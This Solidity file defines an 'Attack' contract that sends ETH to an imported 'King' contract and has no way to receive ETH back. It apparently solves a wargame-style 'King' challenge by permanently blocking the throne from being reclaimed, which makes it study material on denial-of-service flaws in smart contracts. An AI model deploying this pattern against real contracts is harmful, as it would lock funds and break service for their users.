// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { King } from "./King.sol";

contract Attack {
    King kingContract;

    constructor(address _kingcontract){
        kingContract = King(payable(_kingcontract));
    }


    function attack() external payable {
        require(msg.value > 0, "send ETH to attack");
        (bool ok,) = address(kingContract).call{value: msg.value}("");
        require(ok, "attack call failed");
    }
}